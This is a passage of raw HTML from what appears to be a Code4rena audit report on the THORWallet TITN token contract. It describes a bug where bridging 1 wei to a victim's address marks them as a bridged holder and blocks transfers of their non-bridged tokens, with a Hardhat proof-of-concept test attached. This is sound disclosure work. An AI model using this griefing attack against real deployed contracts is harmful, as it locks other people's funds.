0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003e \u003cstrong\u003eCode References\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBridged Token Tracking (Incorrect Boolean):\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108\"\u003e\u003ccode\u003eTitn.sol#L106-L108\u003c/code\u003e\u003c/a\u003e:  \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis marks \u003ccode\u003e_to\u003c/code\u003e as a bridged holder upon receiving \u003cem\u003eany\u003c/em\u003e bridged tokens.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOverly Restrictive Transfer Validation:\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83\"\u003e\u003ccode\u003eTitn.sol#L82-L83\u003c/code\u003e\u003c/a\u003e:  \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echainid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbitrumChainId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elzEndpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf \u003ccode\u003efrom\u003c/code\u003e is marked as a bridged holder (even for 1 wei), transfers are blocked unless sent to \u003ccode\u003elzEndpoint\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e \u003cstrong\u003eAttack Scenario\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMalicious User Action\u003c/strong\u003e:  \u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAttacker bridges 1 wei of TITN to Victim’s address on Base.  \u003c/li\u003e\n\u003cli\u003eVictim is now marked as \u003ccode\u003eisBridgedTokenHolder[Victim] = true\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVictim’s Attempted Transfer\u003c/strong\u003e:  \u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eVictim holds 1000 non-bridged TITN tokens.  \u003c/li\u003e\n\u003cli\u003eTries to transfer 1000 TITN to another address (not \u003ccode\u003elzEndpoint\u003c/code\u003e or \u003ccode\u003etransferAllowedContract\u003c/code\u003e).  \u003c/li\u003e\n\u003cli\u003eTransaction reverts with \u003ccode\u003eBridgedTokensTransferLocked()\u003c/code\u003e, even though all tokens are non-bridged.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e \u003cstrong\u003eCoded Proof of Concept\u003c/strong\u003e\n\u003ccode\u003e./test/hardhat/Titn.test.ts\u003c/code\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;malicious user can bridged token to others to lock thier non-bridged tokens\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// mint non-bridged TITN to victim (Base)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictimNonBridgedTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictimNonBridgedTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efalse\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// mint TITN to attacker (Arb)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// await arbTITN.connect(ownerB).transfer(attacker.address, ethers.utils.parseEther(\u0026#39;1\u0026#39;))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattackerTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enewOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddExecutorLzReceiveOption\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e200000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoHex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// to attacker\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattackerTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattackerTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker bridges 1 wei to Victim\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;.000001\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksSendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// to victim\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksNativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksSendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            .\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            .\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksSendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksNativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// POC: Victim attempts to transfer non-bridged tokens, Fails due to boolean 